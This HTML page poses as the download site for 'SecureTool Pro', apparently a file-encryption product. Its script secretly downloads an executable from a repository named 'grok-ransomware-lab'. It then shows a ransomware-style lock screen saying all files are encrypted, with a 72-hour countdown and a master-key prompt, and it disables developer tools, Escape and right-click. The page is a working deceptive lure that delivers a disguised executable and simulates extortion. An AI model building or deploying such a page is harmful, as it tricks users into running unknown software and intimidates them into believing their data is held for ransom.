<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SecureTool Pro v3.2</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --primary: #1a73e8; --success: #0d8c52; --danger: #d93025; --dark: #0d1117; --light: #f6f8fa; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {font-family:'Inter',sans-serif;background:#f8f9fa;color:#333;line-height:1.6;overflow:hidden;}
    .hero {background:linear-gradient(135deg,#1a73e8,#0d8c52);color:white;padding:80px 20px;text-align:center;position:relative;}
    .hero h1 {font-size:2.8rem;font-weight:700;margin-bottom:16px;}
    .hero p {font-size:1.2rem;max-width:700px;margin:0 auto 30px;}
    .btn {display:inline-block;background:var(--success);color:white;padding:14px 32px;font-size:1.1rem;font-weight:600;border:none;border-radius:50px;cursor:pointer;transition:all .3s;box-shadow:0 4px 12px rgba(13,140,82,0.3);}
    .btn:hover {background:#0a6b42;transform:translateY(-2px);}
    .footer {text-align:center;padding:40px 20px;background:var(--dark);color:#8b949e;font-size:0.9rem;position:fixed;bottom:0;width:100%;z-index:1;}
    .footer a {color:#58a6ff;text-decoration:none;}
    
    /* PADLOCK SCREEN */
    .padlock-screen {
      position:fixed;top:0;left:0;width:100vw;height:100vh;
      background:#000;color:#f00;font-family:monospace;
      display:none;flex-direction:column;align-items:center;justify-content:center;
      z-index:99999;user-select:none;
    }
    .padlock-screen.show {display:flex;}
    .lock-icon {font-size:120px;margin-bottom:20px;}
    .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;margin:20px 0;background:#111;color:#fff;}
    .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
    .msg {margin-top:20px;font-size:18px;color:#0f0;}
    .countdown {font-size:36px;color:#ff0;margin:20px 0;}
  </style>
</head>
<body oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">

  <!-- HERO -->
  <section class="hero">
    <div style="max-width:700px;margin:0 auto;">
      <h1>SecureTool Pro v3.2</h1>
      <p>Enterprise file encryption for Windows 10/11. Secure your data now.</p>
      <button class="btn" id="activateBtn">Download & Activate Now</button>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <p>© 2025 SecureTool Inc. • <a href="#">Privacy</a></p>
  </footer>

  <!-- PADLOCK -->
  <div class="padlock-screen" id="padlock">
    <div class="lock-icon">Locked</div>
    <h1>SECURETOOL PRO</h1>
    <p style="color:#ccc;">All files are encrypted.</p>
    <div class="countdown" id="timer">72:00:00</div>
    <p style="color:#ccc;">Enter master key:</p>
    <input type="password" class="input-key" id="masterKey" placeholder="Master Key">
    <button class="unlock-btn" onclick="unlock()">Unlock</button>
    <p class="msg" id="msg"></p>
  </div>

  <!-- WORKING SCRIPT -->
  <script>
    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
    let timeLeft = 72 * 3600;
    const timerEl = document.getElementById('timer');

    function updateTimer() {
      if (timeLeft <= 0) { timerEl.innerHTML = "EXPIRED"; return; }
      const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
      const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
      const s = String(timeLeft % 60).padStart(2, '0');
      timerEl.innerHTML = `${h}:${m}:${s}`;
      timeLeft--;
      setTimeout(updateTimer, 1000);
    }

    document.getElementById('activateBtn').onclick = function() {
      // 1. DOWNLOAD REAL .EXE
      const a = document.createElement('a');
      a.href = 'https://github.com/grok-ransomware-lab/securetool/releases/download/v3.2/SecureTool_Pro_v3.2.exe';
      a.download = 'SecureTool_Pro_v3.2.exe';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // 2. SHOW PADLOCK
      setTimeout(() => {
        document.getElementById('padlock').classList.add('show');
        document.body.style.overflow = 'hidden';
        updateTimer();
      }, 1000);

      alert('Downloading... Run SecureTool_Pro_v3.2.exe to activate.');
    };

    function unlock() {
      if (document.getElementById('masterKey').value === KEY) {
        document.getElementById('msg').innerHTML = 'UNLOCKED!';
        setTimeout(() => location.reload(), 2000);
      } else {
        document.getElementById('msg').innerHTML = 'WRONG KEY!';
      }
    }

    // BLOCK BYPASSES
    document.onkeydown = function(e) {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'Escape') {
        e.preventDefault();
        return false;
      }
    };
    document.oncontextmenu = e => e.preventDefault();
  </script>
</body>
</html>
